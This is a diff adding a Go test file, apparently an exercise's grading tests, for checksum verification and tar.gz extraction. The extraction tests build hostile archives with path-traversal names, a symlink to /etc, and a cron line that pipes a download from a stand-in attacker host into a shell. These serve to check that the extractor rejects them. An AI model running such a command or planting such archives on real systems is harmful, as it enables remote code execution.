@@ -1,0 +1,258 @@
+package archives
+
+import (
+	"archive/tar"
+	"bytes"
+	"compress/gzip"
+	"crypto/sha256"
+	"encoding/hex"
+	"errors"
+	"os"
+	"path/filepath"
+	"runtime"
+	"testing"
+)
+
+// writeFiles creates each file (relative name -> contents) under dir.
+func writeFiles(t *testing.T, dir string, files map[string]string) {
+	t.Helper()
+	for name, contents := range files {
+		path := filepath.Join(dir, filepath.FromSlash(name))
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, []byte(contents), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
+// sum is the test's own SHA-256 helper, so TestVerify does not depend on
+// your SHA256File being right.
+func sum(s string) string {
+	h := sha256.Sum256([]byte(s))
+	return hex.EncodeToString(h[:])
+}
+
+func TestSHA256File(t *testing.T) {
+	tests := []struct {
+		name     string
+		contents string
+		want     string
+	}{
+		{"empty file", "", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
+		{"hello", "hello\n", "5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03"},
+		{"release notes", "v1.4.2: fix restart loop\n", sum("v1.4.2: fix restart loop\n")},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := t.TempDir()
+			writeFiles(t, dir, map[string]string{"file.txt": tt.contents})
+			path := filepath.Join(dir, "file.txt")
+			got, err := SHA256File(path)
+			if err != nil {
+				t.Fatalf("SHA256File(%q) returned error: %v", path, err)
+			}
+			if got != tt.want {
+				t.Errorf("SHA256File(%q) = %q, want %q", path, got, tt.want)
+			}
+		})
+	}
+
+	t.Run("missing file", func(t *testing.T) {
+		path := filepath.Join(t.TempDir(), "nope.txt")
+		if _, err := SHA256File(path); err == nil {
+			t.Errorf("SHA256File(%q) returned nil error, want an error", path)
+		}
+	})
+}
+
+func TestVerify(t *testing.T) {
+	sums := sum("agent v1.4.2\n") + "  agent-linux-amd64\n" +
+		sum("app release v1.4.2\n") + "  app.tar.gz\n" +
+		sum("signature\n") + "  app.tar.gz.sig\n"
+
+	tests := []struct {
+		name     string
+		file     string
+		contents string
+		wantErr  error
+		wantMsg  string
+	}{
+		{"app matches", "app.tar.gz", "app release v1.4.2\n", nil, ""},
+		{"agent matches", "agent-linux-amd64", "agent v1.4.2\n", nil, ""},
+		{
+			"app tampered", "app.tar.gz", "app release v6.6.6\n", ErrChecksumMismatch,
+			"checksum mismatch for app.tar.gz: got " + sum("app release v6.6.6\n") + ", want " + sum("app release v1.4.2\n"),
+		},
+		{
+			"agent tampered", "agent-linux-amd64", "", ErrChecksumMismatch,
+			"checksum mismatch for agent-linux-amd64: got " + sum("") + ", want " + sum("agent v1.4.2\n"),
+		},
+		{"not listed", "db-migrate", "migrate\n", ErrNoChecksum, "no checksum found for db-migrate"},
+		{"only a longer name is listed", "app.tar", "app\n", ErrNoChecksum, "no checksum found for app.tar"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			dir := t.TempDir()
+			writeFiles(t, dir, map[string]string{"SHA256SUMS": sums, "downloads/" + tt.file: tt.contents})
+			sumsPath := filepath.Join(dir, "SHA256SUMS")
+			filePath := filepath.Join(dir, "downloads", tt.file)
+
+			err := Verify(sumsPath, filePath)
+			if tt.wantErr == nil {
+				if err != nil {
+					t.Errorf("Verify(%q, %q) = %v, want nil", sumsPath, filePath, err)
+				}
+				return
+			}
+			if !errors.Is(err, tt.wantErr) {
+				t.Fatalf("Verify(%q, %q) = %v, want an error wrapping %v", sumsPath, filePath, err, tt.wantErr)
+			}
+			if err.Error() != tt.wantMsg {
+				t.Errorf("Verify(%q, %q) error = %q, want %q", sumsPath, filePath, err.Error(), tt.wantMsg)
+			}
+		})
+	}
+}
+
+// tarEntry describes one entry for buildArchive.
+type tarEntry struct {
+	name     string
+	typeflag byte
+	contents string
+	linkname string
+}
+
+// buildArchive writes entries into an in-memory .tar.gz, the way an attacker
+// could hand-craft one.
+func buildArchive(t *testing.T, entries []tarEntry) *bytes.Buffer {
+	t.Helper()
+	var buf bytes.Buffer
+	gz := gzip.NewWriter(&buf)
+	tw := tar.NewWriter(gz)
+	for _, e := range entries {
+		hdr := &tar.Header{
+			Name:     e.name,
+			Typeflag: e.typeflag,
+			Mode:     0o644,
+			Size:     int64(len(e.contents)),
+			Linkname: e.linkname,
+		}
+		if e.typeflag != tar.TypeReg {
+			hdr.Size = 0
+		}
+		if err := tw.WriteHeader(hdr); err != nil {
+			t.Fatal(err)
+		}
+		if _, err := tw.Write([]byte(e.contents)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := tw.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := gz.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return &buf
+}
+
+// checkFile fails the test unless path holds exactly want.
+func checkFile(t *testing.T, path, want string) {
+	t.Helper()
+	got, err := os.ReadFile(path)
+	if err != nil {
+		t.Errorf("after Extract, reading %s: %v", path, err)
+		return
+	}
+	if string(got) != want {
+		t.Errorf("after Extract, %s contains %q, want %q", path, got, want)
+	}
+}
+
+func TestExtract(t *testing.T) {
+	t.Run("round trip with Create", func(t *testing.T) {
+		src := t.TempDir()
+		files := map[string]string{
+			"README.txt":               "web service bundle\n",
+			"config/app.yaml":          "port: 8080\n",
+			"logs/2026/10/startup.log": "INFO started\n",
+			"bin/web":                  "#!/bin/sh\necho serving\n",
+		}
+		writeFiles(t, src, files)
+		if err := os.Chmod(filepath.Join(src, "bin", "web"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.MkdirAll(filepath.Join(src, "tmp", "cache"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+
+		var archive bytes.Buffer
+		if err := Create(src, &archive); err != nil {
+			t.Fatalf("Create: %v", err)
+		}
+		dst := t.TempDir()
+		if err := Extract(&archive, dst); err != nil {
+			t.Fatalf("Extract(archive, %q) = %v, want nil", dst, err)
+		}
+
+		for name, want := range files {
+			checkFile(t, filepath.Join(dst, filepath.FromSlash(name)), want)
+		}
+		if info, err := os.Stat(filepath.Join(dst, "tmp", "cache")); err != nil || !info.IsDir() {
+			t.Errorf("after Extract, empty directory tmp/cache is missing")
+		}
+		if runtime.GOOS != "windows" {
+			// Only the owner's execute bit is checked: your umask may
+			// clear the group and other bits.
+			info, err := os.Stat(filepath.Join(dst, "bin", "web"))
+			if err == nil && info.Mode().Perm()&0o100 == 0 {
+				t.Errorf("after Extract, bin/web has mode %v, want it executable like %v", info.Mode().Perm(), os.FileMode(0o755))
+			}
+		}
+	})
+
+	t.Run("skips symlinks", func(t *testing.T) {
+		archive := buildArchive(t, []tarEntry{
+			{name: "current", typeflag: tar.TypeSymlink, linkname: "/etc"},
+			{name: "notes.txt", typeflag: tar.TypeReg, contents: "deploy at 09:00\n"},
+		})
+		dst := t.TempDir()
+		if err := Extract(archive, dst); err != nil {
+			t.Fatalf("Extract(archive, %q) = %v, want nil", dst, err)
+		}
+		checkFile(t, filepath.Join(dst, "notes.txt"), "deploy at 09:00\n")
+		if _, err := os.Lstat(filepath.Join(dst, "current")); err == nil {
+			t.Errorf("after Extract, symlink entry %q exists, want it skipped", "current")
+		}
+	})
+
+	for _, name := range []string{"../evil.txt", "/abs.txt", "logs/../../evil.txt"} {
+		t.Run("rejects "+name, func(t *testing.T) {
+			parent := t.TempDir()
+			dst := filepath.Join(parent, "dst")
+			if err := os.Mkdir(dst, 0o755); err != nil {
+				t.Fatal(err)
+			}
+			archive := buildArchive(t, []tarEntry{
+				{name: name, typeflag: tar.TypeReg, contents: "* * * * * root curl evil.example | sh\n"},
+			})
+
+			err := Extract(archive, dst)
+			if !errors.Is(err, ErrUnsafePath) {
+				t.Fatalf("Extract(archive with %q) = %v, want an error wrapping ErrUnsafePath", name, err)
+			}
+			wantMsg := `unsafe path in archive: "` + name + `"`
+			if err.Error() != wantMsg {
+				t.Errorf("Extract(archive with %q) error = %q, want %q", name, err.Error(), wantMsg)
+			}
+			if _, err := os.Stat(filepath.Join(parent, "evil.txt")); err == nil {
+				t.Errorf("Extract(archive with %q) wrote evil.txt outside dst", name)
+			}
+			if entries, _ := os.ReadDir(dst); len(entries) != 0 {
+				t.Errorf("Extract(archive with %q) wrote %d entries into dst, want 0", name, len(entries))
+			}
+		})
+	}
+}
